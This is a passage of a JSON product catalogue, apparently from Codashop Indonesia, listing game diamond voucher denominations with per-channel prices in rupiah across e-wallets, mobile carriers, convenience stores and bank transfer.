0","deal":false},{"id":5196,"voucherDenominationId":599,"pricePointPaymentChannel":{"id":22,"name":"INDOSAT","displayName":"Indosat","displayName2":"Indosat","isMno":true,"sortOrder":5,"countryCode":360,"tagline":"Beli pakai pulsa Indosat","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/INDOSAT_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":5206,"voucherDenominationId":599,"pricePointPaymentChannel":{"id":200,"name":"BITX_IDN","displayName":"Bitcoin","displayName2":"BitX IND","isMno":false,"sortOrder":42,"countryCode":360,"tagline":"Bayar dengan Bitcoin","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BITX_IDN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":11495,"voucherDenominationId":599,"pricePointPaymentChannel":{"id":229,"name":"KREDIVO","displayName":"Kredivo","displayName2":"Kredivo (Indonesia)","isMno":false,"sortOrder":14,"countryCode":360,"tagline":"Cicilan Tanpa Kartu Kredit","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/KREDIVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":65000.0,"channelVariablePrice":false,"displayPrice":"Rp. 65.000","deal":false},{"id":5195,"voucherDenominationId":599,"pricePointPaymentChannel":{"id":24,"name":"TELKOMSEL","displayName":"Telkomsel","displayName2":"Telkomsel","isMno":true,"sortOrder":3,"countryCode":360,"tagline":"Beli pakai pulsa Telkomsel","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/TELKOMSEL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":5197,"voucherDenominationId":599,"pricePointPaymentChannel":{"id":26,"name":"HUTCH_THREE","displayName":"Tri Indonesia","displayName2":"Tri Indonesia","isMno":true,"sortOrder":7,"countryCode":360,"tagline":"Beli pakai pulsa Tri Indonesia","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/HUTCH_THREE_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":5202,"voucherDenominationId":599,"pricePointPaymentChannel":{"id":400,"name":"CARD_PAYMENT","displayName":"Kartu Kredit","displayName2":"Card Payment ID","isMno":false,"sortOrder":26,"countryCode":360,"tagline":"Bayar dengan kartu kredit","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/Card_Payment_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":65000.0,"channelVariablePrice":false,"displayPrice":"Rp. 65.000","deal":false},{"id":20359,"voucherDenominationId":599,"pricePointPaymentChannel":{"id":240,"name":"DANA","displayName":"Dana","displayName2":"Dana","isMno":false,"sortOrder":11,"countryCode":360,"tagline":"Bayar dengan Dana","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/DANA_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":61750.0,"channelVariablePrice":false,"displayPrice":"Rp. 61.750","deal":true},{"id":5201,"voucherDenominationId":599,"pricePointPaymentChannel":{"id":226,"name":"Indomaret","displayName":"Indomaret","displayName2":"Indomaret","isMno":false,"sortOrder":22,"countryCode":360,"tagline":"Bayar di Indomaret","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/Indomaret_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":68250.0,"channelVariablePrice":false,"displayPrice":"Rp. 68.250","deal":false},{"id":5204,"voucherDenominationId":599,"pricePointPaymentChannel":{"id":224,"name":"SEVELIN","displayName":"7-Eleven (Indonesia)","displayName2":"7-Eleven","isMno":false,"sortOrder":34,"countryCode":360,"tagline":"Bayar di 7-Eleven","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/SEVELIN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":20358,"voucherDenominationId":599,"pricePointPaymentChannel":{"id":230,"name":"OVO","displayName":"OVO","displayName2":"OVO","isMno":false,"sortOrder":1,"countryCode":360,"tagline":"Bayar dengan OVO","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/OVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":61750.0,"channelVariablePrice":false,"displayPrice":"Rp. 61.750","deal":true},{"id":5200,"voucherDenominationId":599,"pricePointPaymentChannel":{"id":221,"name":"DOKU_OTC","displayName":"Alfamart","displayName2":"Alfamart","isMno":false,"sortOrder":18,"countryCode":360,"tagline":"Bayar di Alfamart","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_OTC_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":65000.0,"channelVariablePrice":false,"displayPrice":"Rp. 65.000","deal":false},{"id":5194,"voucherDenominationId":599,"pricePointPaymentChannel":{"id":227,"name":"GO_PAY","displayName":"GoPay","displayName2":"GoPay","isMno":false,"sortOrder":0,"countryCode":360,"tagline":"Bayar dengan CodaPay (Diskon 100%)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/GO_PAY_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":65000.0,"channelVariablePrice":false,"displayPrice":"Rp. 65.000","deal":false},{"id":29276,"voucherDenominationId":599,"pricePointPaymentChannel":{"id":234,"name":"LINKAJA_ID","displayName":"LinkAja","displayName2":"LinkAja","isMno":false,"sortOrder":12,"countryCode":360,"tagline":"Bayar dengan LinkAja","tutorialType":2,"tutorialURL":"  https://cdn1.codashop.com/S/content/common/images/mno/linkaja_tutorial.jpg","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/LINKAJA_ID_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":5199,"voucherDenominationId":599,"pricePointPaymentChannel":{"id":220,"name":"DOKU_ATM","displayName":"Bank Transfer","displayName2":"Bank Transfer Indonesia","isMno":false,"sortOrder":2,"countryCode":360,"tagline":"Bayar melalui ATM atau transfer Mobile Banking","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_ATM_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":61750.0,"channelVariablePrice":false,"displayPrice":"Rp. 61.750","deal":true},{"id":5203,"voucherDenominationId":599,"pricePointPaymentChannel":{"id":223,"name":"DOKU_WALLET","displayName":"DOKU Wallet","displayName2":"DOKU Wallet","isMno":false,"sortOrder":30,"countryCode":360,"tagline":"Bayar dengan DOKU Wallet","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_WALLET_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":65000.0,"channelVariablePrice":false,"displayPrice":"Rp. 65.000","deal":false}],"_status":1,"variableDenominationVoucher":false},{"displayPrice":"296 Diamonds","id":212,"sellerId":50,"voucherId":"diamond_codashopIDR_80000","skuHashId":-1624509378,"sortOrderId":11,"voucherPricePoints":[{"id":1474,"voucherDenominationId":212,"pricePointPaymentChannel":{"id":224,"name":"SEVELIN","displayName":"7-Eleven (Indonesia)","displayName2":"7-Eleven","isMno":false,"sortOrder":34,"countryCode":360,"tagline":"Bayar di 7-Eleven","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/SEVELIN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1480,"voucherDenominationId":212,"pricePointPaymentChannel":{"id":223,"name":"DOKU_WALLET","displayName":"DOKU Wallet","displayName2":"DOKU Wallet","isMno":false,"sortOrder":30,"countryCode":360,"tagline":"Bayar dengan DOKU Wallet","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_WALLET_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":80000.0,"channelVariablePrice":false,"displayPrice":"Rp. 80.000","deal":false},{"id":2870,"voucherDenominationId":212,"pricePointPaymentChannel":{"id":226,"name":"Indomaret","displayName":"Indomaret","displayName2":"Indomaret","isMno":false,"sortOrder":22,"countryCode":360,"tagline":"Bayar di Indomaret","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/Indomaret_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":84000.0,"channelVariablePrice":false,"displayPrice":"Rp. 84.000","deal":false},{"id":1479,"voucherDenominationId":212,"pricePointPaymentChannel":{"id":25,"name":"BOLT","displayName":"Bolt","displayName2":"Bolt","isMno":true,"sortOrder":38,"countryCode":360,"tagline":"Beli pakai pulsa Bolt. Nomor Ponsel \u003d Nomor BOLT! (999xxxxxxx)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BOLT_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1472,"voucherDenominationId":212,"pricePointPaymentChannel":{"id":221,"name":"DOKU_OTC","displayName":"Alfamart","displayName2":"Alfamart","isMno":false,"sortOrder":18,"countryCode":360,"tagline":"Bayar di Alfamart","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_OTC_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":80000.0,"channelVariablePrice":false,"displayPrice":"Rp. 80.000","deal":false},{"id":4158,"voucherDenominationId":212,"pricePointPaymentChannel":{"id":227,"name":"GO_PAY","displayName":"GoPay","displayName2":"GoPay","isMno":false,"sortOrder":0,"countryCode":360,"tagline":"Bayar dengan CodaPay (Diskon 100%)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/GO_PAY_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":80000.0,"channelVariablePrice":false,"displayPrice":"Rp. 80.000","deal":false},{"id":1481,"voucherDenominationId":212,"pricePointPaymentChannel":{"id":200,"name":"BITX_IDN","displayName":"Bitcoin","displayName2":"BitX IND","isMno":false,"sortOrder":42,"countryCode":360,"tagline":"Bayar dengan Bitcoin","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BITX_IDN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1476,"voucherDenominationId":212,"pricePointPaymentChannel":{"id":23,"name":"XL","displayName":"XL Axiata","displayName2":"XL Axiata","isMno":true,"sortOrder":9,"countryCode":360,"tagline":"Beli pakai pulsa XL","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/XL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":100000.0,"channelVariablePrice":false,"displayPrice":"Rp. 100.000","deal":false},{"id":1478,"voucherDenominationId":212,"pricePointPaymentChannel":{"id":26,"name":"HUTCH_THREE","displayName":"Tri Indonesia","displayName2":"Tri Indonesia","isMno":true,"sortOrder":7,"countryCode":360,"tagline":"Beli pakai pulsa Tri Indonesia","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/HUTCH_THREE_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":100000.0,"channelVariablePrice":false,"displayPrice":"Rp. 100.000","deal":false},{"id":11496,"voucherDenominationId":212,"pricePointPaymentChannel":{"id":229,"name":"KREDIVO","displayName":"Kredivo","displayName2":"Kredivo (Indonesia)","isMno":false,"sortOrder":14,"countryCode":360,"tagline":"Cicilan Tanpa Kartu Kredit","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/KREDIVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":80000.0,"channelVariablePrice":false,"displayPrice":"Rp. 80.000","deal":false},{"id":9124,"voucherDenominationId":212,"pricePointPaymentChannel":{"id":228,"name":"TRUE_MONEY_AGENT_NETWORK","displayName":"TrueMoney","displayName2":"TMAN (Indonesia)","isMno":false,"sortOrder":50,"countryCode":360,"tagline":"Bayar di TrueMoney Agent","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/TRUE_MONEY_AGENT_NETWORK_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":80000.0,"channelVariablePrice":false,"displayPrice":"Rp. 80.000","deal":false},{"id":1473,"voucherDenominationId":212,"pricePointPaymentChannel":{"id":400,"name":"CARD_PAYMENT","displayName":"Kartu Kredit","displayName2":"Card Payment ID","isMno":false,"sortOrder":26,"countryCode":360,"tagline":"Bayar dengan kartu kredit","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/Card_Payment_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":80000.0,"channelVariablePrice":false,"displayPrice":"Rp. 80.000","deal":false},{"id":29277,"voucherDenominationId":212,"pricePointPaymentChannel":{"id":234,"name":"LINKAJA_ID","displayName":"LinkAja","displayName2":"LinkAja","isMno":false,"sortOrder":12,"countryCode":360,"tagline":"Bayar dengan LinkAja","tutorialType":2,"tutorialURL":"  https://cdn1.codashop.com/S/content/common/images/mno/linkaja_tutorial.jpg","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/LINKAJA_ID_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1471,"voucherDenominationId":212,"pricePointPaymentChannel":{"id":220,"name":"DOKU_ATM","displayName":"Bank Transfer","displayName2":"Bank Transfer Indonesia","isMno":false,"sortOrder":2,"countryCode":360,"tagline":"Bayar melalui ATM atau transfer Mobile Banking","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_ATM_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":76000.0,"channelVariablePrice":false,"displayPrice":"Rp. 76.000","deal":true},{"id":1475,"voucherDenominationId":212,"pricePointPaymentChannel":{"id":22,"name":"INDOSAT","displayName":"Indosat","displayName2":"Indosat","isMno":true,"sortOrder":5,"countryCode":360,"tagline":"Beli pakai pulsa Indosat","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/INDOSAT_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":100000.0,"channelVariablePrice":false,"displayPrice":"Rp. 100.000","deal":false},{"id":1477,"voucherDenominationId":212,"pricePointPaymentChannel":{"id":24,"name":"TELKOMSEL","displayName":"Telkomsel","displayName2":"Telkomsel","isMno":true,"sortOrder":3,"countryCode":360,"tagline":"Beli pakai pulsa Telkomsel","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/TELKOMSEL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":100000.0,"channelVariablePrice":false,"displayPrice":"Rp. 100.000","deal":false},{"id":20360,"voucherDenominationId":212,"pricePointPaymentChannel":{"id":230,"name":"OVO","displayName":"OVO","displayName2":"OVO","isMno":false,"sortOrder":1,"countryCode":360,"tagline":"Bayar dengan OVO","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/OVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":76000.0,"channelVariablePrice":false,"displayPrice":"Rp. 76.000","deal":true},{"id":20361,"voucherDenominationId":212,"pricePointPaymentChannel":{"id":240,"name":"DANA","displayName":"Dana","displayName2":"Dana","isMno":false,"sortOrder":11,"countryCode":360,"tagline":"Bayar dengan Dana","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/DANA_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":76000.0,"channelVariablePrice":false,"displayPrice":"Rp. 76.000","deal":true}],"_status":1,"variableDenominationVoucher":false},{"displayPrice":"408 Diamonds","id":213,"sellerId":50,"voucherId":"diamond_codashopIDR_110000","skuHashId":-1624509378,"sortOrderId":12,"voucherPricePoints":[{"id":29278,"voucherDenominationId":213,"pricePointPaymentChannel":{"id":234,"name":"LINKAJA_ID","displayName":"LinkAja","displayName2":"LinkAja","isMno":false,"sortOrder":12,"countryCode":360,"tagline":"Bayar dengan LinkAja","tutorialType":2,"tutorialURL":"  https://cdn1.codashop.com/S/content/common/images/mno/linkaja_tutorial.jpg","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/LINKAJA_ID_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1489,"voucherDenominationId":213,"pricePointPaymentChannel":{"id":26,"name":"HUTCH_THREE","displayName":"Tri Indonesia","displayName2":"Tri Indonesia","isMno":true,"sortOrder":7,"countryCode":360,"tagline":"Beli pakai pulsa Tri Indonesia","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/HUTCH_THREE_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1482,"voucherDenominationId":213,"pricePointPaymentChannel":{"id":220,"name":"DOKU_ATM","displayName":"Bank Transfer","displayName2":"Bank Transfer Indonesia","isMno":false,"sortOrder":2,"countryCode":360,"tagline":"Bayar melalui ATM atau transfer Mobile Banking","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_ATM_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":104500.0,"channelVariablePrice":false,"displayPrice":"Rp. 104.500","deal":true},{"id":1486,"voucherDenominationId":213,"pricePointPaymentChannel":{"id":22,"name":"INDOSAT","displayName":"Indosat","displayName2":"Indosat","isMno":true,"sortOrder":5,"countryCode":360,"tagline":"Beli pakai pulsa Indosat","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/INDOSAT_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":20363,"voucherDenominationId":213,"pricePointPaymentChannel":{"id":240,"name":"DANA","displayName":"Dana","displayName2":"Dana","isMno":false,"sortOrder":11,"countryCode":360,"tagline":"Bayar dengan Dana","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/DANA_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":104500.0,"channelVariablePrice":false,"displayPrice":"Rp. 104.500","deal":true},{"id":9125,"voucherDenominationId":213,"pricePointPaymentChannel":{"id":228,"name":"TRUE_MONEY_AGENT_NETWORK","displayName":"TrueMoney","displayName2":"TMAN (Indonesia)","isMno":false,"sortOrder":50,"countryCode":360,"tagline":"Bayar di TrueMoney Agent","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/TRUE_MONEY_AGENT_NETWORK_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":110000.0,"channelVariablePrice":false,"displayPrice":"Rp. 110.000","deal":false},{"id":1485,"voucherDenominationId":213,"pricePointPaymentChannel":{"id":224,"name":"SEVELIN","displayName":"7-Eleven (Indonesia)","displayName2":"7-Eleven","isMno":false,"sortOrder":34,"countryCode":360,"tagline":"Bayar di 7-Eleven","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/SEVELIN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1483,"voucherDenominationId":213,"pricePointPaymentChannel":{"id":221,"name":"DOKU_OTC","displayName":"Alfamart","displayName2":"Alfamart","isMno":false,"sortOrder":18,"countryCode":360,"tagline":"Bayar di Alfamart","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_OTC_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":110000.0,"channelVariablePrice":false,"displayPrice":"Rp. 110.000","deal":false},{"id":1490,"voucherDenominationId":213,"pricePointPaymentChannel":{"id":25,"name":"BOLT","displayName":"Bolt","displayName2":"Bolt","isMno":true,"sortOrder":38,"countryCode":360,"tagline":"Beli pakai pulsa Bolt. Nomor Ponsel \u003d Nomor BOLT! (999xxxxxxx)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BOLT_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":4159,"voucherDenominationId":213,"pricePointPaymentChannel":{"id":227,"name":"GO_PAY","displayName":"GoPay","displayName2":"GoPay","isMno":false,"sortOrder":0,"countryCode":360,"tagline":"Bayar dengan CodaPay (Diskon 100%)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/GO_PAY_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":110000.0,"channelVariablePrice":false,"displayPrice":"Rp. 110.000","deal":false},{"id":11497,"voucherDenominationId":213,"pricePointPaymentChannel":{"id":229,"name":"KREDIVO","displayName":"Kredivo","displayName2":"Kredivo (Indonesia)","isMno":false,"sortOrder":14,"countryCode":360,"tagline":"Cicilan Tanpa Kartu Kredit","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/KREDIVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":110000.0,"channelVariablePrice":false,"displayPrice":"Rp. 110.000","deal":false},{"id":2871,"voucherDenominationId":213,"pricePointPaymentChannel":{"id":226,"name":"Indomaret","displayName":"Indomaret","displayName2":"Indomaret","isMno":false,"sortOrder":22,"countryCode":360,"tagline":"Bayar di Indomaret","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/Indomaret_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":115500.0,"channelVariablePrice":false,"displayPrice":"Rp. 115.500","deal":false},{"id":1488,"voucherDenominationId":213,"pricePointPaymentChannel":{"id":24,"name":"TELKOMSEL","displayName":"Telkomsel","displayName2":"Telkomsel","isMno":true,"sortOrder":3,"countryCode":360,"tagline":"Beli pakai pulsa Telkomsel","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/TELKOMSEL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1484,"voucherDenominationId":213,"pricePointPaymentChannel":{"id":400,"name":"CARD_PAYMENT","displayName":"Kartu Kredit","displayName2":"Card Payment ID","isMno":false,"sortOrder":26,"countryCode":360,"tagline":"Bayar dengan kartu kredit","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/Card_Payment_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":110000.0,"channelVariablePrice":false,"displayPrice":"Rp. 110.000","deal":false},{"id":20362,"voucherDenominationId":213,"pricePointPaymentChannel":{"id":230,"name":"OVO","displayName":"OVO","displayName2":"OVO","isMno":false,"sortOrder":1,"countryCode":360,"tagline":"Bayar dengan OVO","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/OVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":104500.0,"channelVariablePrice":false,"displayPrice":"Rp. 104.500","deal":true},{"id":1492,"voucherDenominationId":213,"pricePointPaymentChannel":{"id":200,"name":"BITX_IDN","displayName":"Bitcoin","displayName2":"BitX IND","isMno":false,"sortOrder":42,"countryCode":360,"tagline":"Bayar dengan Bitcoin","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BITX_IDN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1491,"voucherDenominationId":213,"pricePointPaymentChannel":{"id":223,"name":"DOKU_WALLET","displayName":"DOKU Wallet","displayName2":"DOKU Wallet","isMno":false,"sortOrder":30,"countryCode":360,"tagline":"Bayar dengan DOKU Wallet","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_WALLET_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":110000.0,"channelVariablePrice":false,"displayPrice":"Rp. 110.000","deal":false},{"id":1487,"voucherDenominationId":213,"pricePointPaymentChannel":{"id":23,"name":"XL","displayName":"XL Axiata","displayName2":"XL Axiata","isMno":true,"sortOrder":9,"countryCode":360,"tagline":"Beli pakai pulsa XL","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/XL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false}],"_status":1,"variableDenominationVoucher":false},{"displayPrice":"568 Diamonds","id":214,"sellerId":50,"voucherId":"diamond_codashopIDR_150000","skuHashId":-1624509378,"sortOrderId":13,"voucherPricePoints":[{"id":1501,"voucherDenominationId":214,"pricePointPaymentChannel":{"id":25,"name":"BOLT","displayName":"Bolt","displayName2":"Bolt","isMno":true,"sortOrder":38,"countryCode":360,"tagline":"Beli pakai pulsa Bolt. Nomor Ponsel \u003d Nomor BOLT! (999xxxxxxx)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BOLT_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1498,"voucherDenominationId":214,"pricePointPaymentChannel":{"id":23,"name":"XL","displayName":"XL Axiata","displayName2":"XL Axiata","isMno":true,"sortOrder":9,"countryCode":360,"tagline":"Beli pakai pulsa XL","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/XL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":9126,"voucherDenominationId":214,"pricePointPaymentChannel":{"id":228,"name":"TRUE_MONEY_AGENT_NETWORK","displayName":"TrueMoney","displayName2":"TMAN (Indonesia)","isMno":false,"sortOrder":50,"countryCode":360,"tagline":"Bayar di TrueMoney Agent","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/TRUE_MONEY_AGENT_NETWORK_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":150000.0,"channelVariablePrice":false,"displayPrice":"Rp. 150.000","deal":false},{"id":1496,"voucherDenominationId":214,"pricePointPaymentChannel":{"id":224,"name":"SEVELIN","displayName":"7-Eleven (Indonesia)","displayName2":"7-Eleven","isMno":false,"sortOrder":34,"countryCode":360,"tagline":"Bayar di 7-Eleven","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/SEVELIN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":20365,"voucherDenominationId":214,"pricePointPaymentChannel":{"id":240,"name":"DANA","displayName":"Dana","displayName2":"Dana","isMno":false,"sortOrder":11,"countryCode":360,"tagline":"Bayar dengan Dana","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/DANA_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":142500.0,"channelVariablePrice":false,"displayPrice":"Rp. 142.500","deal":true},{"id":1500,"voucherDenominationId":214,"pricePointPaymentChannel":{"id":26,"name":"HUTCH_THREE","displayName":"Tri Indonesia","displayName2":"Tri Indonesia","isMno":true,"sortOrder":7,"countryCode":360,"tagline":"Beli pakai pulsa Tri 